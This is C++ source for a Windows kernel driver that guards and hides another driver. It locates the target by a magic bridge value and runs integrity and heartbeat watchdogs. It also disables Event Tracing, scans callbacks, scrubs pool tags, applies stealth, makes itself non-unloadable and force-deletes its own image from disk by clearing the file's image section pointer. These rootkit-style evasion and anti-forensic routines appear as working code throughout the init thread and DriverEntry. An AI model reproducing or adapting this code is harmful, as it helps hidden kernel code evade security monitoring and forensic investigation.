#include <ntifs.h>
#include <Crypter.h>
#include <imports/Defs.h>
#include <core/Guardian.h>


#pragma data_seg(".sntl")
volatile PVOID  g_target_driver_base   = nullptr;
volatile PVOID  g_target_driver_object = nullptr;
volatile ULONG  g_target_driver_size   = 0;
#pragma data_seg()


#pragma comment(linker, "/SECTION:.sntl,RW")


#ifndef FILE_DISPOSITION_FLAG_DELETE
#define FILE_DISPOSITION_FLAG_DELETE                 0x00000001
#endif
#ifndef FILE_DISPOSITION_FLAG_POSIX_SEMANTICS
#define FILE_DISPOSITION_FLAG_POSIX_SEMANTICS       0x00000002
#endif
#ifndef FILE_DISPOSITION_FLAG_IGNORE_READONLY_ATTRIBUTE
#define FILE_DISPOSITION_FLAG_IGNORE_READONLY_ATTRIBUTE 0x00000010
#endif

static constexpr FILE_INFORMATION_CLASS FileDispositionInformationExClass =
    static_cast<FILE_INFORMATION_CLASS>(64);

constexpr ULONG TAG_DEL = 'leDW';


static PDRIVER_OBJECT g_sentinel_driver_object = nullptr;
static volatile LONG  g_shutdown_flag = 0;
static HANDLE         g_init_thread_handle = nullptr;
static WCHAR          g_registry_path_buffer[512] = {};
static UNICODE_STRING g_registry_path = {};


static bool find_text_section(PVOID image_base, PVOID* out_base, ULONG* out_size) {
    if (!image_base || !_MmIsAddressValid(image_base))
        return false;

    __try {
        PIMAGE_DOS_HEADER dos = static_cast<PIMAGE_DOS_HEADER>(image_base);
        if (dos->e_magic != IMAGE_DOS_SIGNATURE)
            return false;

        PIMAGE_NT_HEADERS64 nt = reinterpret_cast<PIMAGE_NT_HEADERS64>(
            static_cast<UCHAR*>(image_base) + dos->e_lfanew);
        if (!_MmIsAddressValid(nt) || nt->Signature != IMAGE_NT_SIGNATURE)
            return false;

        PIMAGE_SECTION_HEADER sections = IMAGE_FIRST_SECTION(nt);
        for (USHORT i = 0; i < nt->FileHeader.NumberOfSections; i++) {


            if (sections[i].Name[0] == '.' &&
                sections[i].Name[1] == 't' &&
                sections[i].Name[2] == 'e' &&
                sections[i].Name[3] == 'x' &&
                sections[i].Name[4] == 't') {
                *out_base = static_cast<UCHAR*>(image_base) + sections[i].VirtualAddress;
                *out_size = sections[i].Misc.VirtualSize;
                return true;
            }
        }
    } __except (EXCEPTION_EXECUTE_HANDLER) {
        return false;
    }

    return false;
}


static bool find_target_text(PVOID target_base, PVOID* out_text, ULONG* out_text_size) {
    return find_text_section(target_base, out_text, out_text_size);
}


static PDRIVER_OBJECT find_target_driver_object(PVOID target_base) {
    UNREFERENCED_PARAMETER(target_base);

    if (g_target_driver_object && _MmIsAddressValid((PVOID)g_target_driver_object))
        return static_cast<PDRIVER_OBJECT>((PVOID)g_target_driver_object);


    return nullptr;
}


static BOOLEAN ForceDeleteFileByPath(PUNICODE_STRING FilePath) {
    if (!FilePath || !FilePath->Buffer || !_ZwSetInformationFile)
        return FALSE;

    OBJECT_ATTRIBUTES objAttr;
    InitializeObjectAttributes(&objAttr, FilePath,
        OBJ_KERNEL_HANDLE | OBJ_CASE_INSENSITIVE, NULL, NULL);


    {
        HANDLE clearHandle = NULL;
        IO_STATUS_BLOCK clearIosb = {};
        NTSTATUS clearStatus = ZwCreateFile(
            &clearHandle,
            FILE_READ_ATTRIBUTES | SYNCHRONIZE,
            &objAttr,
            &clearIosb,
            NULL,
            FILE_ATTRIBUTE_NORMAL,
            FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
            FILE_OPEN,
            FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT,
            NULL, 0);

        if (NT_SUCCESS(clearStatus) && clearHandle) {
            PFILE_OBJECT fileObj = NULL;
            clearStatus = ObReferenceObjectByHandle(
                clearHandle, 0, *IoFileObjectType, KernelMode,
                reinterpret_cast<PVOID*>(&fileObj), NULL);

            if (NT_SUCCESS(clearStatus) && fileObj) {
                PSECTION_OBJECT_POINTERS sop = fileObj->SectionObjectPointer;
                if (sop)
                    sop->ImageSectionObject = NULL;
                ObDereferenceObject(fileObj);
            }
            _ZwClose(clearHandle);
        }
    }


    if (_IoCreateFileEx) {
        HANDLE fileHandle = NULL;
        IO_STATUS_BLOCK ioStatus = {};
        IO_DRIVER_CREATE_CONTEXT createCtx = {};
        createCtx.Size = sizeof(createCtx);

        NTSTATUS status = _IoCreateFileEx(
            &fileHandle,
            DELETE | SYNCHRONIZE | FILE_WRITE_ATTRIBUTES,
            &objAttr, &ioStatus, NULL,
            FILE_ATTRIBUTE_NORMAL,
            FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
            FILE_OPEN,
            FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT,
            NULL, 0, CreateFileTypeNone, NULL,
            IO_IGNORE_SHARE_ACCESS_CHECK, &createCtx);

        if (NT_SUCCESS(status)) {
            struct { ULONG Flags; } dispEx = {};
            dispEx.Flags = FILE_DISPOSITION_FLAG_DELETE
                         | FILE_DISPOSITION_FLAG_POSIX_SEMANTICS
                         | FILE_DISPOSITION_FLAG_IGNORE_READONLY_ATTRIBUTE;

            status = _ZwSetInformationFile(
                fileHandle, &ioStatus,
                &dispEx, sizeof(dispEx),
                FileDispositionInformationExClass);
            _ZwClose(fileHandle);

            if (NT_SUCCESS(status))
                return TRUE;
        }
    }


    if (_ZwDeleteFile) {
        if (NT_SUCCESS(_ZwDeleteFile(&objAttr)))
            return TRUE;
    }


    if (_IoCreateFileEx) {
        HANDLE fileHandle = NULL;
        IO_STATUS_BLOCK ioStatus = {};
        IO_DRIVER_CREATE_CONTEXT createCtx = {};
        createCtx.Size = sizeof(createCtx);

        NTSTATUS status = _IoCreateFileEx(
            &fileHandle,
            DELETE | SYNCHRONIZE,
            &objAttr, &ioStatus, NULL,
            FILE_ATTRIBUTE_NORMAL,
            FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
            FILE_OPEN,
            FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT | FILE_DELETE_ON_CLOSE,
            NULL, 0, CreateFileTypeNone, NULL,
            IO_IGNORE_SHARE_ACCESS_CHECK, &createCtx);

        if (NT_SUCCESS(status)) {
            _ZwClose(fileHandle);
            return TRUE;
        }
    }


    {
        HANDLE fileHandle = NULL;
        IO_STATUS_BLOCK ioStatus = {};
        NTSTATUS status = ZwCreateFile(
            &fileHandle,
            DELETE | SYNCHRONIZE,
            &objAttr, &ioStatus, NULL,
            FILE_ATTRIBUTE_NORMAL,
            FILE_SHARE_DELETE,
            FILE_OPEN,
            FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT,
            NULL, 0);

        if (!NT_SUCCESS(status))
            return FALSE;

        struct { BOOLEAN DeleteFile; } dispInfo = { TRUE };
        status = _ZwSetInformationFile(
            fileHandle, &ioStatus,
            &dispInfo, sizeof(dispInfo),
            static_cast<FILE_INFORMATION_CLASS>(13));
        _ZwClose(fileHandle);
        return NT_SUCCESS(status);
    }
}


static VOID DeleteDriverOnDisk(PUNICODE_STRING RegistryPath) {
    if (!RegistryPath || !RegistryPath->Buffer)
        return;
    if (!_ZwOpenKey || !_ZwQueryValueKey || !_ZwClose)
        return;

    OBJECT_ATTRIBUTES keyAttr;
    InitializeObjectAttributes(&keyAttr, RegistryPath,
        OBJ_KERNEL_HANDLE | OBJ_CASE_INSENSITIVE, NULL, NULL);

    HANDLE keyHandle = NULL;
    NTSTATUS status = _ZwOpenKey(&keyHandle, KEY_READ, &keyAttr);
    if (!NT_SUCCESS(status))
        return;

    UNICODE_STRING valueName;
    _RtlInitUnicodeString(&valueName, L"ImagePath");

    ULONG kvSize = 0;
    status = _ZwQueryValueKey(keyHandle, &valueName,
        KeyValuePartialInformation, NULL, 0, &kvSize);
    if (status != STATUS_BUFFER_TOO_SMALL && status != STATUS_BUFFER_OVERFLOW) {
        _ZwClose(keyHandle);
        return;
    }

    auto kvInfo = static_cast<PKEY_VALUE_PARTIAL_INFORMATION>(
        ExAllocatePool2(POOL_FLAG_NON_PAGED, kvSize, TAG_DEL));

    if (!kvInfo) {
        _ZwClose(keyHandle);
        return;
    }

    status = _ZwQueryValueKey(keyHandle, &valueName,
        KeyValuePartialInformation, kvInfo, kvSize, &kvSize);
    _ZwClose(keyHandle);

    if (!NT_SUCCESS(status) ||
        (kvInfo->Type != REG_SZ && kvInfo->Type != REG_EXPAND_SZ)) {
        ExFreePoolWithTag(kvInfo, TAG_DEL);
        return;
    }

    ULONG dataLen = kvInfo->DataLength;
    if (dataLen >= sizeof(WCHAR)) {
        PWCHAR imgBuf = reinterpret_cast<PWCHAR>(kvInfo->Data);
        ULONG chars = dataLen / sizeof(WCHAR);
        if (imgBuf[chars - 1] == L'\0')
            chars--;

        UNICODE_STRING imagePath;
        imagePath.Buffer = imgBuf;
        imagePath.Length = static_cast<USHORT>(chars * sizeof(WCHAR));
        imagePath.MaximumLength = static_cast<USHORT>(dataLen);

        ForceDeleteFileByPath(&imagePath);
    }

    ExFreePoolWithTag(kvInfo, TAG_DEL);
}


static void NTAPI init_thread_routine(PVOID ) {

    SN_LOG("init_thread: started");

    constexpr ULONG MAX_POLLS = 300;
    constexpr LONG64 POLL_INTERVAL = -1'000'000LL;

    LARGE_INTEGER interval;
    interval.QuadPart = POLL_INTERVAL;

    for (ULONG i = 0; i < MAX_POLLS; i++) {
        if (_InterlockedCompareExchange(&g_shutdown_flag, 0, 0)) {
            SN_LOG("init_thread: shutdown flag set at poll %lu", i);
            goto exit_thread;
        }

        if (g_target_driver_base != nullptr) {
            SN_LOG("init_thread: g_target_driver_base pre-set at %p after %lu polls", (PVOID)g_target_driver_base, i);
            break;
        }

        if (i % 50 == 0) {
            SN_LOG("init_thread: polling loop iteration %lu/%lu, g_target_driver_base still NULL", i, MAX_POLLS);
        }

        _KeDelayExecutionThread(KernelMode, FALSE, &interval);
    }


    if (g_target_driver_base == nullptr) {
        SN_LOG("init_thread: g_target_driver_base still NULL after polling, scanning module list...");

        if (g_sentinel_driver_object &&
            _MmIsAddressValid(g_sentinel_driver_object) &&
            g_sentinel_driver_object->DriverSection &&
            _MmIsAddressValid(g_sentinel_driver_object->DriverSection))
        {
            PLDR_DATA_TABLE_ENTRY sentinel_ldr = static_cast<PLDR_DATA_TABLE_ENTRY>(
                g_sentinel_driver_object->DriverSection);
            PLIST_ENTRY list_head = &sentinel_ldr->InLoadOrderModuleList;
            PLIST_ENTRY entry = list_head->Flink;
            ULONG safety = 512;
            ULONG modules_checked = 0;

            SN_LOG("init_thread: sentinel_ldr=%p base=%p size=0x%lx",
                sentinel_ldr, sentinel_ldr->DllBase, sentinel_ldr->SizeOfImage);

            while (entry && entry != list_head && safety-- > 0) {
                if (!_MmIsAddressValid(entry)) {
                    SN_LOG("init_thread: entry %p not valid, stopping walk", entry);
                    break;
                }

                PLDR_DATA_TABLE_ENTRY mod = CONTAINING_RECORD(
                    entry, LDR_DATA_TABLE_ENTRY, InLoadOrderModuleList);

                if (!_MmIsAddressValid(mod) || !mod->DllBase || !mod->SizeOfImage) {
                    entry = entry->Flink;
                    continue;
                }


                if (mod->DllBase == sentinel_ldr->DllBase) {
                    entry = entry->Flink;
                    continue;
                }

                PVOID mod_base = mod->DllBase;
                ULONG mod_size = mod->SizeOfImage;

                modules_checked++;


                if (reinterpret_cast<ULONG_PTR>(mod_base) < 0xFFFF800000000000ULL ||
                    mod_size > 50 * 1024 * 1024) {
                    SN_LOG("init_thread: mod %p size=0x%lx skipped (bad range)", mod_base, mod_size);
                    entry = entry->Flink;
                    continue;
                }

                SN_LOG("init_thread: checking module %p size=0x%lx for bridge magic", mod_base, mod_size);

                __try {
                    if (!_MmIsAddressValid(mod_base))
                        goto next_module;

                    PIMAGE_DOS_HEADER dos = static_cast<PIMAGE_DOS_HEADER>(mod_base);
                    if (dos->e_magic != IMAGE_DOS_SIGNATURE) {
                        SN_LOG("init_thread: mod %p bad DOS sig", mod_base);
                        goto next_module;
                    }

                    PIMAGE_NT_HEADERS64 nt = reinterpret_cast<PIMAGE_NT_HEADERS64>(
                        static_cast<UCHAR*>(mod_base) + dos->e_lfanew);
                    if (!_MmIsAddressValid(nt) || nt->Signature != IMAGE_NT_SIGNATURE) {
                        SN_LOG("init_thread: mod %p bad NT sig", mod_base);
                        goto next_module;
                    }

                    PIMAGE_SECTION_HEADER sections = IMAGE_FIRST_SECTION(nt);
                    SN_LOG("init_thread: mod %p has %u sections", mod_base, nt->FileHeader.NumberOfSections);

                    for (USHORT si = 0; si < nt->FileHeader.NumberOfSections; si++) {
                        UCHAR* sec_base = static_cast<UCHAR*>(mod_base) + sections[si].VirtualAddress;
                        ULONG sec_size = sections[si].Misc.VirtualSize;

                        if (sec_size < sizeof(heartbeat::sentinel_bridge_t))
                            continue;

                        ULONG magic_checks = 0;
                        for (ULONG off = 0; off <= sec_size - sizeof(heartbeat::sentinel_bridge_t); off += 4) {
                            if (!_MmIsAddressValid(sec_base + off))
                                continue;

                            volatile UINT32* magic_ptr = reinterpret_cast<volatile UINT32*>(sec_base + off);
                            if (*magic_ptr != heartbeat::BRIDGE_MAGIC)
                                continue;

                            magic_checks++;
                            SN_LOG("init_thread: BRIDGE_MAGIC found at %p (mod %p sec[%u] off=0x%lx)",
                                magic_ptr, mod_base, si, off);

                            volatile UINT32* ver_ptr = magic_ptr + 1;
                            if (!_MmIsAddressValid(reinterpret_cast<PVOID>(const_cast<UINT32*>(ver_ptr)))) {
                                SN_LOG("init_thread: version ptr %p not valid", ver_ptr);
                                continue;
                            }

                            if (*ver_ptr != heartbeat::BRIDGE_VERSION) {
                                SN_LOG("init_thread: version mismatch: got %u expected %u",
                                    *ver_ptr, heartbeat::BRIDGE_VERSION);
                                continue;
                            }

                            SN_LOG("init_thread: BRIDGE FOUND at %p (magic=0x%lx ver=%u) in module %p",
                                magic_ptr, *magic_ptr, *ver_ptr, mod_base);
                            g_target_driver_base = mod_base;
                            g_target_driver_size = mod_size;
                            goto discovery_done;
                        }
                    }
                } __except (EXCEPTION_EXECUTE_HANDLER) {
                    SN_LOG("init_thread: EXCEPTION scanning module %p", mod_base);
                }

            next_module:
                entry = entry->Flink;
            }

            SN_LOG("init_thread: module list scan complete, checked %lu modules", modules_checked);
        } else {
            SN_LOG("init_thread: cannot scan module list: driver_obj=%p valid=%d section=%p",
                g_sentinel_driver_object,
                g_sentinel_driver_object ? (int)_MmIsAddressValid(g_sentinel_driver_object) : -1,
                g_sentinel_driver_object ? g_sentinel_driver_object->DriverSection : nullptr);
        }
    }
discovery_done:

    if (g_target_driver_base == nullptr) {
        SN_LOG("init_thread: FATAL - target driver NOT FOUND, exiting");
        goto exit_thread;
    }

    SN_LOG("init_thread: target found at %p size=0x%lx, beginning subsystem init",
        (PVOID)g_target_driver_base, g_target_driver_size);

    {
        PVOID target_base = (PVOID)g_target_driver_base;

        if (!_MmIsAddressValid(target_base)) {
            SN_LOG("init_thread: target_base %p not valid after discovery", target_base);
            goto exit_thread;
        }

        if (reinterpret_cast<ULONG_PTR>(target_base) < 0xFFFF800000000000ULL) {
            SN_LOG("init_thread: target_base %p below kernel range", target_base);
            goto exit_thread;
        }

        PVOID target_text = nullptr;
        ULONG target_text_size = 0;
        if (!find_target_text(target_base, &target_text, &target_text_size)) {
            SN_LOG("init_thread: find_target_text FAILED for %p", target_base);
            goto exit_thread;
        }

        if (!target_text || target_text_size == 0 || target_text_size > 10 * 1024 * 1024) {
            SN_LOG("init_thread: bad text section: base=%p size=0x%lx", target_text, target_text_size);
            goto exit_thread;
        }

        SN_LOG("init_thread: target .text at %p size=0x%lx", target_text, target_text_size);

        PDRIVER_OBJECT target_driver_obj = find_target_driver_object(target_base);
        SN_LOG("init_thread: target_driver_obj=%p", target_driver_obj);


        bool integrity_ok = integrity::init(target_text, target_text_size);
        SN_LOG("init_thread: integrity::init = %d", (int)integrity_ok);


        if (target_driver_obj) {
            bool dg_ok = dispatch_guard::snapshot(target_driver_obj);
            SN_LOG("init_thread: dispatch_guard::snapshot = %d", (int)dg_ok);
        } else {
            SN_LOG("init_thread: skip dispatch_guard::snapshot (no driver obj)");
        }


        bool ml_ok = dispatch_guard::init_module_list(g_sentinel_driver_object);
        SN_LOG("init_thread: dispatch_guard::init_module_list = %d", (int)ml_ok);


        // ── heartbeat + guardian MUST init before slow subsystems ──
        // etw_disable, callback_scanner, pool_scrub each pattern-scan ntoskrnl
        // (~16 MB) which can take tens of seconds. If heartbeat::init() and
        // guardian::start() come after those, sentinel_tsc stays 0 the entire
        // time, and WhosWho's watchdog DPC hits the stale-streak threshold
        // (6 × 10 s = 60 s after the 90 s grace) → false BSOD 0xDEAD5E10.
        //
        // heartbeat::init() only locates the bridge struct (fast PE walk).
        // guardian::start() arms a 10 s DPC that calls update_and_check()
        // every tick. Every other DPC subsystem (integrity::verify,
        // dispatch_guard::verify, etw_disable::monitor_reenablement, etc.)
        // checks its own g_initialized flag and returns early if not yet
        // initialized, so starting the DPC before those subsystems is safe.
        {
            ULONG hb_size = g_target_driver_size ? g_target_driver_size : target_text_size * 4;
            SN_LOG("init_thread: heartbeat::init target_base=%p hb_size=0x%lx (driver_size=0x%lx text_size=0x%lx)",
                target_base, hb_size, g_target_driver_size, target_text_size);
            bool hb_ok = heartbeat::init(target_base, hb_size);
            SN_LOG("init_thread: heartbeat::init = %d", (int)hb_ok);

            if (hb_ok) {
                // Write a non-zero sentinel_tsc immediately so the watchdog
                // sees liveness before the first guardian DPC tick (~10 s).
                heartbeat::update_and_check();
                SN_LOG("init_thread: heartbeat initial tick done");
            }
        }


        SN_LOG("init_thread: starting guardian...");
        bool guard_ok = guardian::start();
        SN_LOG("init_thread: guardian::start = %d", (int)guard_ok);


        // ── slow subsystems below — safe now that heartbeat is live ──
        {
            PVOID nt_base = reinterpret_cast<PVOID>(get_nt_base());
            SN_LOG("init_thread: nt_base=%p for etw_disable", nt_base);
            if (nt_base) {
                bool etw_ok = etw_disable::init();
                SN_LOG("init_thread: etw_disable::init = %d", (int)etw_ok);
            }
        }


        {
            PVOID nt_base = reinterpret_cast<PVOID>(get_nt_base());
            if (nt_base) {
                bool cb_ok = callback_scanner::init();
                SN_LOG("init_thread: callback_scanner::init = %d", (int)cb_ok);
            }
        }


        {
            PVOID nt_base = reinterpret_cast<PVOID>(get_nt_base());
            if (nt_base) {
                bool ps_ok = pool_scrub::init();
                SN_LOG("init_thread: pool_scrub::init = %d", (int)ps_ok);
                pool_scrub::scrub_tags();
                SN_LOG("init_thread: pool_scrub::scrub_tags done");
            }
        }


        if (target_driver_obj) {
            bool og_ok = object_guard::init(target_driver_obj);
            SN_LOG("init_thread: object_guard::init = %d", (int)og_ok);
        }


        SN_LOG("init_thread: calling thread_guard::ipi_clear_all_cpus");
        thread_guard::ipi_clear_all_cpus();
        SN_LOG("init_thread: thread_guard done");


        __try {
            SN_LOG("init_thread: calling self_protect::apply_stealth");
            self_protect::apply_stealth(g_sentinel_driver_object);
            SN_LOG("init_thread: self_protect::apply_stealth done");
        } __except (EXCEPTION_EXECUTE_HANDLER) {
            SN_LOG("init_thread: EXCEPTION in self_protect::apply_stealth");
        }


        if (g_registry_path.Buffer && g_registry_path.Length > 0) {
            SN_LOG("init_thread: deleting driver on disk");
            DeleteDriverOnDisk(&g_registry_path);
        }

        SN_LOG("init_thread: ALL SUBSYSTEMS INITIALIZED");
    }

exit_thread:
    SN_LOG("init_thread: exiting");
    _PsTerminateSystemThread(STATUS_SUCCESS);
}


NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath) {


    if (!SetupFunctions())
        return STATUS_UNSUCCESSFUL;

    SN_LOG("DriverEntry: SetupFunctions OK");

    g_sentinel_driver_object = DriverObject;


    if (RegistryPath && RegistryPath->Buffer && RegistryPath->Length > 0) {
        USHORT copy_len = RegistryPath->Length;
        if (copy_len > sizeof(g_registry_path_buffer) - sizeof(WCHAR))
            copy_len = sizeof(g_registry_path_buffer) - sizeof(WCHAR);

        RtlCopyMemory(g_registry_path_buffer, RegistryPath->Buffer, copy_len);
        g_registry_path_buffer[copy_len / sizeof(WCHAR)] = L'\0';

        g_registry_path.Buffer = g_registry_path_buffer;
        g_registry_path.Length = copy_len;
        g_registry_path.MaximumLength = sizeof(g_registry_path_buffer);
    }


    DriverObject->DriverUnload = nullptr;


    if (DriverObject->DriverSection) {
        auto ldr = static_cast<PLDR_DATA_TABLE_ENTRY>(DriverObject->DriverSection);
        ldr->Flags |= 0x20u;
    }


    PVOID own_text = nullptr;
    ULONG own_text_size = 0;
    PVOID own_base = nullptr;

    if (DriverObject->DriverSection && _MmIsAddressValid(DriverObject->DriverSection)) {
        auto ldr = static_cast<PLDR_DATA_TABLE_ENTRY>(DriverObject->DriverSection);
        own_base = ldr->DllBase;
    }

    SN_LOG("DriverEntry: own_base=%p", own_base);

    if (own_base) {
        find_text_section(own_base, &own_text, &own_text_size);
    }

    SN_LOG("DriverEntry: own_text=%p own_text_size=0x%lx", own_text, own_text_size);

    if (own_text && own_text_size > 0) {
        bool bl_ok = self_protect::init_baseline(own_text, own_text_size);
        SN_LOG("DriverEntry: self_protect::init_baseline = %d", (int)bl_ok);
    }


    HANDLE thread_handle = nullptr;
    NTSTATUS status = _PsCreateSystemThread(
        &thread_handle,
        THREAD_ALL_ACCESS,
        nullptr,
        nullptr,
        nullptr,
        init_thread_routine,
        nullptr);

    SN_LOG("DriverEntry: PsCreateSystemThread status=0x%08lx handle=%p", status, thread_handle);

    if (NT_SUCCESS(status) && thread_handle) {
        g_init_thread_handle = thread_handle;


        _ZwClose(thread_handle);
        g_init_thread_handle = nullptr;
    }

    SN_LOG("DriverEntry: returning STATUS_SUCCESS, g_target_driver_base=%p", (PVOID)g_target_driver_base);
    return STATUS_SUCCESS;
}
